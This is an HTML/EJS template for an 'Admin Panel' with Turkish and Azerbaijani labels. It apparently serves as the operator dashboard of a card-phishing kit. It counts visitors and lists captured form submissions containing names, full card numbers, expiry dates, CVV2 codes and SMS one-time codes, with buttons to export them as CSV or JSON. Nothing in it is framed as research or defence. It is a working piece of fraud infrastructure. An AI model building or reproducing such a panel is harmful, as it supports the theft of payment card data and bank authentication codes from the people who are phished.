<!DOCTYPE html>
<html lang="tr">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta charset="UTF-8">
  <title>Admin Panel</title>

  <!-- 1) Font Awesome FIRST -->
  <link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"
  > <!-- :contentReference[oaicite:8]{index=8} -->

  <!-- 2) AdminLTE CSS -->
  <link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/admin-lte@3.2.0/dist/css/adminlte.min.css"
  > <!-- :contentReference[oaicite:9]{index=9} -->
</head>
<body class="hold-transition sidebar-mini">
<div class="wrapper">

  <!-- Navbar -->
  <nav class="main-header navbar navbar-expand navbar-white navbar-light">
    <ul class="navbar-nav">
      <li class="nav-item">
        <a class="nav-link" data-widget="pushmenu" href="#" role="button">
          <i class="fas fa-bars"></i>
        </a>
      </li>
    </ul>
    <ul class="navbar-nav ml-auto">
      <li class="nav-item"><a href="/logout" class="nav-link">Çıkış</a></li>
    </ul>
  </nav>

  <!-- Sidebar -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <a href="#" class="brand-link"><span class="brand-text font-weight-light">Admin Panel</span></a>
    <div class="sidebar"><nav class="mt-2">
      <ul class="nav nav-pills nav-sidebar flex-column">
        <li class="nav-item">
          <a href="/panel" class="nav-link active">
            <i class="nav-icon fa-solid fa-house"></i>  <!-- fa-solid kullandık :contentReference[oaicite:10]{index=10} -->
            <p>Form Kayıtları</p>
          </a>
        </li>
      </ul>
    </nav></div>
  </aside>

  <!-- Content -->
  <div class="content-wrapper p-3">
    <div class="row mb-4">
    
      <!-- Toplam Ziyaretçi Kartı -->
      <div class="col-lg-3 col-6">
        <div class="small-box bg-info">
          <div class="inner">
            <h3><%= visits %></h3>
            <p>Toplam Ziyaretçi</p>
          </div>
          <div class="icon">
            <i class="fa-solid fa-users"></i>
          </div>
        </div>
      </div>
  
      <!-- Toplam Data Kartı -->
      <div class="col-lg-3 col-6">
        <div class="small-box bg-success">
          <div class="inner">
            <h3><%= submissions.length %></h3> <!-- Form kayıt sayısı -->
            <p>Toplam Data</p>
          </div>
          <div class="icon">
            <i class="fa-solid fa-database"></i>
          </div>
        </div>
      </div>
  
    </div>
    <section class="content">
      
      <div class="card">
        
        
        <div class="card-header">
          <h3 class="card-title">
            <i class="fa-solid fa-house mr-2"></i>  <!-- başlık ikonu + mr-2 Bootstrap4 sınıfı :contentReference[oaicite:13]{index=13} -->
            Card data
          </h3>
          <div style="display: flex;  justify-content: flex-end">
          <a href="/export/csv" target="_blank">
            <button style="margin: 10px;">CSV olarak indir</button>
          </a>
          <a href="/export/json" target="_blank">
            <button style="margin: 10px;">JSON olarak indir</button>
          </a>
        </div>
        </div>
        <div class="card-body table-responsive p-0">
          <table class="table table-hover text-nowrap">
            <thead>
              <tr><th>ID</th><th>Ad və Soyad</th><th>Kart nömrəsi
            </th><th>Kartın bitmə tarixi</th><th>CVC2 / CVV2
            </th><th>SMS</th></tr>
            </thead>
            <tbody>
              <% submissions.forEach(r => { %>
                <tr>
                  <td><%= r.id         %></td>
                  <td><%= r.name   %></td>
                  <td><%= r.card     %></td>
                  <td><%= r.expdate %></td>
                  <td><%= r.cvv       %></td>
                  <td><%= r.smsCode || '—' %>
                </tr>
              <% }) %>
            </tbody>
          </table>
        </div>
      </div>
    </section>
  </div>
</div>

<!-- Scripts: jQuery, Bootstrap4, AdminLTE -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script> <!-- :contentReference[oaicite:14]{index=14} -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <!-- :contentReference[oaicite:15]{index=15} -->
<script src="https://cdn.jsdelivr.net/npm/admin-lte@3.2.0/dist/js/adminlte.min.js"></script> <!-- :contentReference[oaicite:16]{index=16} -->
</body>
</html>
